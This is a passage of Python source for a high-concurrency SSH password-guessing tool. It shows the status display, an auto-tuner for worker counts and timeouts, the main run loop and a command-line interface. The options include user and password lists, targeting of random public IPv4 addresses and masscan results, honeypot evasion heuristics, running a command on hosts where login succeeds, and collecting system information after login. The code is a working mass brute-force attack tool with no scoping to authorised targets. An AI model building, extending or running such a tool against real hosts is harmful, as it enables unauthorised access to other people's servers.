            f"[magenta]Active[/] {metrics['active']}/{metrics['allowed_workers']} (max {cfg.max_workers}) q {metrics['qsize']} pend {metrics['pending']}",
        )
        grid.add_row(
            f"[green]Succ[/] {metrics['successes']} [red]Fail[/] {metrics['failures']} [yellow]Skip[/] {metrics['skipped']}",
            f"[bright_black]Timeouts[/] {metrics['timeouts']} ({metrics['timeouts_r']:.1%}) [red]Err[/] {metrics['errors']} ({metrics['errors_r']:.1%}) [blue]SR[/] {metrics['success_rate']:.2%}",
        )
        grid.add_row(
            f"[blue]CPU[/] {metrics['cpu_str']} | Net {metrics['net_str']}",
            f"[cyan]Post[/] {metrics['post_pending']}" if metrics["post_pending"] else "",
        )
        if metrics["tuner_note"]:
            grid.add_row(f"[bright_black]Tuner[/] {metrics['tuner_note']}", "")
        return Panel(Group(progress, grid), title="[bold]fastssh status[/]", border_style="cyan")

    metrics = await snapshot(time.monotonic())

    if use_rich:
        console = Console()
        total = metrics["total"]
        progress = Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=None),
            TextColumn("[progress.percentage]{task.percentage:>5.1f}%"),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
            expand=True,
            console=console,
        )
        task_id = progress.add_task("scan", total=total or None, completed=metrics["done"])
        progress.start()

        def render_panel(m: Dict[str, Any]) -> "Panel":
            return render_rich(m, progress, task_id)

        refresh_hz = max(1, int(1 / max(interval, 0.1)))
        with Live(render_panel(metrics), console=console, refresh_per_second=refresh_hz, transient=False) as live:
            while not stop.is_set():
                await asyncio.sleep(interval)
                now = time.monotonic()
                metrics = await snapshot(now)
                live.update(render_panel(metrics))

                idle = metrics["idle"]
                pending_now = metrics["pending"]
                if cfg.hang_timeout > 0 and idle > cfg.hang_timeout and pending_now > 0:
                    console.print(
                        f"[yellow][hang][/yellow] No progress for {idle:.1f}s (threshold {cfg.hang_timeout}s). Draining queue and signaling stop."
                    )
                    stop.set()
                    global_stop.set()
                    drain_queue(queue)
                    break
        progress.stop()
    else:
        sys.stdout.write("\n")
        sys.stdout.write(clear_line + render_plain(metrics))
        sys.stdout.flush()

        while not stop.is_set():
            await asyncio.sleep(interval)
            now = time.monotonic()
            metrics = await snapshot(now)
            sys.stdout.write(clear_line + render_plain(metrics))
            sys.stdout.flush()

            idle = metrics["idle"]
            pending_now = metrics["pending"]
            if cfg.hang_timeout > 0 and idle > cfg.hang_timeout and pending_now > 0:
                sys.stdout.write(
                    f"\n[hang] No progress for {idle:.1f}s (threshold {cfg.hang_timeout}s). Draining queue and signaling stop.\n"
                )
                sys.stdout.flush()
                stop.set()
                global_stop.set()
                drain_queue(queue)
    sys.stdout.write("\n")
    sys.stdout.flush()


def percentile(data: List[float], q: float) -> Optional[float]:
    if not data:
        return None
    if q <= 0:
        return min(data)
    if q >= 1:
        return max(data)
    xs = sorted(data)
    k = (len(xs) - 1) * q
    f = int(k)
    c = min(f + 1, len(xs) - 1)
    if f == c:
        return xs[f]
    return xs[f] + (xs[c] - xs[f]) * (k - f)


async def auto_tuner(
    cfg: Config,
    stats: Dict[str, float],
    stats_lock: asyncio.Lock,
    history: deque,
    stop: asyncio.Event,
    global_stop: asyncio.Event,
) -> None:
    window = cfg.tune_window if cfg.tune_window > 0 else 20.0
    step_workers = max(1, cfg.tune_step_workers)
    last_sps = 0.0
    last_note = "init"
    while not stop.is_set():
        await asyncio.sleep(window / 2)
        now = time.monotonic()
        async with stats_lock:
            snapshot_history = list(history)
            allowed_workers = int(stats.get("allowed_workers", cfg.max_workers))
        cutoff = now - window
        recent = [h for h in snapshot_history if h[0] >= cutoff]
        if not recent or len(recent) < 10:
            continue
        span = max(recent[-1][0] - recent[0][0], 1.0)
        sps = len(recent) / span
        timeouts = sum(1 for _, _, o in recent if o == "timeout")
        errors = sum(1 for _, _, o in recent if o == "error")
        successes = sum(1 for _, _, o in recent if o == "success")
        timeout_ratio = timeouts / len(recent)
        error_ratio = errors / len(recent)

        new_workers = allowed_workers
        note_parts = []
        # worker adjustment
        if timeout_ratio > cfg.tune_max_timeout_ratio or error_ratio > cfg.tune_max_error_ratio:
            new_workers = max(cfg.tune_min_workers, allowed_workers - step_workers)
            note_parts.append(f"backoff workers {allowed_workers}->{new_workers} (to {timeout_ratio:.1%} err {error_ratio:.1%})")
        elif sps > last_sps * 1.05 and allowed_workers < cfg.tune_max_workers:
            new_workers = min(cfg.tune_max_workers, allowed_workers + step_workers)
            note_parts.append(f"raise workers {allowed_workers}->{new_workers} (sps {sps:.2f})")
        else:
            note_parts.append(f"hold workers {allowed_workers} (sps {sps:.2f})")

        # timeout adjustment based on duration quantile of non-timeout attempts
        durations = [d for _, d, o in recent if o not in ("timeout", "skipped")]
        q = percentile(durations, cfg.tune_timeout_quantile)
        if q is not None:
            target_total = min(cfg.tune_timeout_ceiling, max(cfg.tune_timeout_floor, q + cfg.tune_timeout_buffer))
            # keep a little margin to avoid flapping
            if abs(target_total - cfg.attempt_timeout) > 0.25:
                cfg.attempt_timeout = target_total
                cfg.connect_timeout = min(cfg.tune_timeout_ceiling, max(cfg.tune_timeout_floor, target_total * 0.35))
                cfg.auth_timeout = min(cfg.tune_timeout_ceiling, max(cfg.tune_timeout_floor, target_total * 0.45))
                cfg.read_timeout = min(cfg.tune_timeout_ceiling, max(cfg.tune_timeout_floor, target_total * 0.25))
                note_parts.append(f"timeouts -> {target_total:.2f}s (q{int(cfg.tune_timeout_quantile*100)} {q:.2f}s)")

        note = "; ".join(note_parts)
        async with stats_lock:
            stats["allowed_workers"] = max(cfg.tune_min_workers, min(cfg.tune_max_workers, new_workers))
            stats["tuner_note"] = note
        last_sps = sps
        last_note = note

        # safety: if global stop set, exit
        if global_stop.is_set():
            break

async def run(cfg: Config) -> None:
    host_states: Dict[str, HostState] = {}
    await probe_targets(cfg, host_states)

    queue_size = max(0, cfg.queue_size)
    queue: "asyncio.Queue[Optional[WorkItem]]" = asyncio.Queue(maxsize=queue_size)
    post_queue: "asyncio.Queue[dict]" = asyncio.Queue()
    global_stop = asyncio.Event()
    file_lock = asyncio.Lock()
    stats_lock = asyncio.Lock()
    state_lock = asyncio.Lock()
    state: Dict[str, Any] = {"age_cache": load_age_cache(cfg.age_cache)}
    gather_sem = asyncio.Semaphore(max(1, cfg.gather_concurrency))
    history: deque = deque(maxlen=10000)
    stats: Dict[str, float] = {
        "attempts": 0,
        "successes": 0,
        "failures": 0,
        "skipped": 0,
        "errors": 0,
        "timeouts": 0,
        "active": 0,
        "total": count_work_items(cfg),
        "last_progress": time.monotonic(),
        "allowed_workers": cfg.max_workers,
        "tuner_note": "",
    }

    workers = [
        asyncio.create_task(
            worker(
                queue,
                cfg,
                host_states,
                global_stop,
                file_lock,
                stats,
                stats_lock,
                state,
                state_lock,
                gather_sem,
                post_queue,
                history,
            )
        )
        for _ in range(cfg.max_workers)
    ]
    reporter_stop = asyncio.Event()
    reporter = asyncio.create_task(
        progress_reporter(cfg, stats, stats_lock, queue, reporter_stop, global_stop, post_queue, history)
    )
    tuner_stop = asyncio.Event()
    tuner: Optional[asyncio.Task] = None
    if cfg.auto_tune:
        tuner = asyncio.create_task(auto_tuner(cfg, stats, stats_lock, history, tuner_stop, global_stop))

    print("[info] Building work queue...", flush=True)
    await build_queue(cfg, queue, host_states, global_stop)
    print("[info] Work queue built, processing...", flush=True)
    try:
        await queue.join()
        completed = True
    except KeyboardInterrupt:
        print("\n[info] Interrupt received, shutting down gracefully...", flush=True)
        completed = False
    finally:
        global_stop.set()
        reporter_stop.set()
        await reporter
        if tuner:
            tuner_stop.set()
            with contextlib.suppress(Exception):
                await tuner
        for w in workers:
            w.cancel()
        with contextlib.suppress(Exception):
            await asyncio.gather(*workers)
        if cfg.gather_info and cfg.post_process:
            print("\n[info] Post-processing successes...", flush=True)
            await run_post_processing(cfg, post_queue, host_states, file_lock, state, state_lock, gather_sem)
        with contextlib.suppress(Exception):
            save_age_cache(cfg.age_cache, state.get("age_cache", {}))
        with contextlib.suppress(Exception):
            if completed:
                cfg.target_state.update(cfg.target_updates)
            save_target_state(cfg.target_state_path, cfg.target_state)


# -----------------------------------------------------------------------------
# CLI
# -----------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="fast SSH credential testing orchestrator")
    p.add_argument("--target", action="append", help="host or host:ports (comma-separated)")
    p.add_argument("--targets", help="file with host[:ports] per line")
    p.add_argument("--targets-chunk", type=int, help="limit to N target lines from file (after resume offset)")
    p.add_argument("--targets-state", help="path to targets resume state (json)")
    p.add_argument("--no-resume", action="store_true", help="disable auto-resume for targets file")
    p.add_argument("--profile", choices=["fast", "balanced", "info"], help="apply preset tuning (overrides defaults unless manually set)")
    p.add_argument("--masscan-json", help="masscan JSON output to ingest")
    p.add_argument("--random", type=int, default=0, help="generate N random public IPv4s")
    p.add_argument("--port", type=int, default=22, help="default port when none given")

    p.add_argument("--users", nargs="+", help="usernames")
    p.add_argument("--user-file", help="file with usernames")
    p.add_argument("--passwords", nargs="+", help="passwords")
    p.add_argument("--pass-file", help="file with passwords")
    p.add_argument("--combo-file", help="file with user:pass per line")

    p.add_argument("--max-workers", type=int, default=200, help="parallel SSH attempts")
    p.add_argument("--queue-size", type=int, default=10000, help="max queued attempts")
    p.add_argument("--connect-timeout", type=float, default=3.0)
    p.add_argument("--auth-timeout", type=float, default=5.0)
    p.add_argument("--read-timeout", type=float, default=3.0)
    p.add_argument("--attempt-timeout", type=float, default=0.0, help="hard cap (seconds) for a single SSH attempt; 0 = auto (connect+auth+read+1s)")
    p.add_argument("--log-interval", type=float, default=5.0, help="seconds between progress prints")
    p.add_argument("--status-interval", type=float, help="seconds between status refreshes (defaults to log interval)")
    p.add_argument("--hang-timeout", type=float, default=60.0, help="seconds with no progress before hang stop (0 to disable)")
    p.add_argument("--no-pretty-status", action="store_true", help="disable rich-based status UI (fallback to plain text)")

    p.add_argument("--command", help="run this command on success")
    p.add_argument("--no-command-output", action="store_true", help="suppress command stdout/stderr in logs")
    p.add_argument("--stop-first-host", action="store_true", help="stop attacking a host after first success")
    p.add_argument("--stop-first-global", action="store_true", help="stop all work after first success")
    p.add_argument("--no-probe", action="store_true", help="skip TCP probe step")
    p.add_argument("--banner", action="store_true", help="capture SSH banner during probe")
    p.add_argument("--no-shuffle", action="store_true", help="disable randomization of attempts")
    p.add_argument("--results", default="results.jsonl", help="path to JSONL output")
    p.add_argument("--verbose", action="store_true", help="print per-attempt warnings/errors")
    p.add_argument("--allow-non-ssh", action="store_true", help="include non-SSH listeners detected during probe")
    p.add_argument("--gather-info", action="store_true", help="collect system info on successful auth")
    p.add_argument("--no-honeypot-detect", action="store_true", help="disable honeypot heuristics")
    p.add_argument("--post-timeout", type=float, default=5.0, help="timeout budget for post-auth info collection")
    p.add_argument("--age-cache", help="path to hostkey first-seen cache (json)")
    p.add_argument("--gather-concurrency", type=int, default=20, help="max concurrent post-auth info tasks")
    p.add_argument("--post-light", action="store_true", help="lightweight post-auth info (smaller command set)")
    p.add_argument("--no-post-process", action="store_true", help="run gather-info inline instead of post phase")
    p.add_argument("--no-cpu-net", action="store_true", help="disable CPU/net sampling in status")
    p.add_argument("--auto-tune", action="store_true", help="enable SPS auto-tuner for workers/timeouts")
    p.add_argument("--tune-window", type=float, default=20.0, help="rolling window (seconds) for SPS tuning")
    p.add_argument("--tune-min-workers", type=int, default=50, help="lower bound for auto-tuned workers")
    p.add_argument("--tune-max-workers", type=int, default=500, help="upper bound for auto-tuned workers")
    p.add_argument("--tune-step-workers", type=int, default=25, help="step size when adjusting workers")
    p.add_argument("--tune-max-timeout-ratio", type=float, default=0.25, help="cap on timeout fraction before backing off")
    p.add_argument("--tune-max-error-ratio", type=float, default=0.15, help="cap on error fraction before backing off")
    p.add_argument("--tune-timeout-quantile", type=float, default=0.9, help="quantile of durations to set timeout targets")
    p.add_argument("--tune-timeout-buffer", type=float, default=0.5, help="extra seconds added on top of quantile when shrinking timeouts")
    p.add_argument("--tune-timeout-floor", type=float, default=0.5, help="minimum timeout values")
    p.add_argument("--tune-timeout-ceiling", type=float, default=15.0, help="maximum timeout values")
    # Note: a short sanity command runs after auth to ensure the session can execute commands; failures are treated as auth failures.
    return p


def main(argv: Optional[Sequence[str]] = None) -> None:
    parser = build_parser()
    args = parser.parse_args(argv)

    # Auto-detect masscan JSON if given via --targets with a .json file
    if args.targets and not args.masscan_json:
        p = Path(args.targets)
        if p.suffix.lower() == ".json":
            args.masscan_json = args.targets
            args.targets = None
            print(f"[info] Detected JSON targets, treating {p} as --masscan-json", flush=True)

    def apply_profile() -> None:
        if not args.profile:
            return
        profiles = {
            "fast": {
                "max_workers": 400,
                "queue_size": 0,
                "connect_timeout": 1.0,
                "auth_timeout": 2.0,
                "read_timeout": 2.0,
                "log_interval": 2.0,
                "status_interval": 1.0,
                "hang_timeout": 45.0,
                "gather_info": False,
                "post_process": True,
            },
            "balanced": {
                "max_workers": 250,
                "queue_size": 0,
                "connect_timeout": 2.0,
                "auth_timeout": 4.0,
                "read_timeout": 3.0,
                "log_interval": 3.0,
                "status_interval": 1.0,
                "hang_timeout": 60.0,
            },
            "info": {
                "max_workers": 200,
                "queue_size": 0,
                "connect_timeout": 2.5,
                "auth_timeout": 5.0,
                "read_timeout": 4.0,
                "log_interval": 5.0,
                "status_interval": 1.0,
                "hang_timeout": 90.0,
                "gather_info": True,
                "post_timeout": 6.0,
                "post_process": True,
            },
        }
        profile_vals = profiles.get(args.profile, {})
        for key, val in profile_vals.items():
            default_val = parser.get_default(key)
            if getattr(args, key, None) == default_val:
                setattr(args, key, val)

    apply_profile()

    results_target = args.results
    if not results_target or results_target == "results.jsonl":
        ts_struct = time.localtime()
        stamp = time.strftime("%H.%M-%m.%d.%Y", ts_struct)
        base = f"{stamp}-results.jsonl"
        results_path = Path(base)
        idx = 2
        while results_path.exists():
            results_path = Path(f"{idx}-{base}")
            idx += 1
    else:
        results_path = Path(results_target)
    age_cache_path = Path(args.age_cache) if args.age_cache else (Path("age-cache.json") if args.gather_info else None)
    target_state_path = None
    if args.targets_state:
        target_state_path = Path(args.targets_state)
    elif args.targets or args.masscan_json:
        target_state_path = Path("targets-state.json")
    target_state = load_target_state(target_state_path)

    attempt_timeout = args.attempt_timeout
    if attempt_timeout is None or attempt_timeout <= 0:
        attempt_timeout = args.connect_timeout + args.auth_timeout + args.read_timeout + 1.0

    targets, new_target_state, target_updates = collect_targets(
        args,
        target_state=target_state,
        resume=not args.no_resume,
        chunk=args.targets_chunk,
    )

    cfg = Config(
        targets=targets,
        target_state=new_target_state,
        target_state_path=target_state_path,
        target_updates=target_updates,
        combos=load_creds(args),
        connect_timeout=args.connect_timeout,
        auth_timeout=args.auth_timeout,
        read_timeout=args.read_timeout,
        attempt_timeout=attempt_timeout,
        max_workers=args.max_workers,
        queue_size=args.queue_size,
        stop_first_host=args.stop_first_host,
        stop_first_global=args.stop_first_global,
        command=args.command,
        command_output=not args.no_command_output,
        capture_banner=args.banner,
        probe=not args.no_probe,
        shuffle=not args.no_shuffle,
        results_path=results_path,
        log_interval=args.log_interval,
        hang_timeout=args.hang_timeout,
        status_interval=args.status_interval if args.status_interval is not None else args.log_interval,
        verbose=args.verbose,
        require_ssh_banner=not args.allow_non_ssh,
        gather_info=args.gather_info,
        honeypot_detect=not args.no_honeypot_detect,
        post_timeout=args.post_timeout,
        age_cache=age_cache_path,
        gather_concurrency=args.gather_concurrency,
        post_light=args.post_light,
        post_process=not args.no_post_process,
        cpu_net=not args.no_cpu_net,
        pretty_status=not args.no_pretty_status,
        auto_tune=args.auto_tune,
        tune_window=args.tune_window,
        tune_min_workers=args.tune_min_workers,
        tune_max_workers=args.tune_max_workers,
        tune_step_workers=args.tune_step_workers,
        tune_max_timeout_ratio=args.tune_max_timeout_ratio,
        tune_max_error_ratio=args.tune_max_error_ratio,
        tune_timeout_quantile=args.tune_timeout_quantile,
        tune_timeout_buffer=args.tune_timeout_buffer,
        tune_timeout_floor=args.tune_timeout_floor,
        tune_timeout_ceiling=args.tune_timeout_ceiling,
    )

    try:
        asyncio.run(run(cfg))
    except KeyboardInterrupt:
        print("Interrupted, exiting.")
    except Exception as exc:
        print(f"[fatal] Unhandled error: {exc}")


if __name__ == "__main__":
    main()
